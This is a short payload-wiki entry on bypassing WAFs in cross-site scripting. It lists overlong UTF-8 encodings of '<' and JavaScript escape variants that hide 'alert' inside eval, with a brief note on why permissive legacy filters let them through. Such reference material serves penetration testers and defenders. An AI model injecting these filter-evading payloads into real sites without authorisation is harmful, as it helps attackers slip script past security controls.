---
title: Overlong UTF-8 / Unicode Escape Tag Bypass
slug: overlong-utf8-tag-bypass
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/html-injection, sink/waf-bypass]
inbound: []
---

# Overlong UTF-8 / Unicode Escape Tag Bypass

## Payload

```html
%C0%BCscript>alert(1)</script>
```

## Variants

```html
%E0%80%BCscript>alert(1)</script>
%F0%80%80%BCscript>alert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>
<script>eval('\x61lert(1)')</script>
<script>eval('\141lert(1)')</script>
<script>eval('alert(\061)')</script>
```

## Context

Overlong UTF-8 sequences (`%C0%BC`, `%E0%80%BC`, `%F0%80%80%BC`) encode `<` using more bytes than the minimum (non-canonical encoding). Legacy WAFs that decode UTF-8 permissively may normalise these to `<` and pass the payload. Modern browsers reject non-canonical UTF-8, so this primarily targets legacy server-side WAFs/IDS rather than the browser itself. The `\u{...}` JS unicode escape form and hex/octal `\x` / `\1` forms obfuscate identifier characters in JS contexts where the WAF inspects the script body. The JS variants require the payload to reach a script execution context (eval, function body).

## Provenance

- Distilled from: `../../techniques/dom-xss/waf-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [WAF Bypass and Obfuscation](../../techniques/dom-xss/waf-bypass.md)
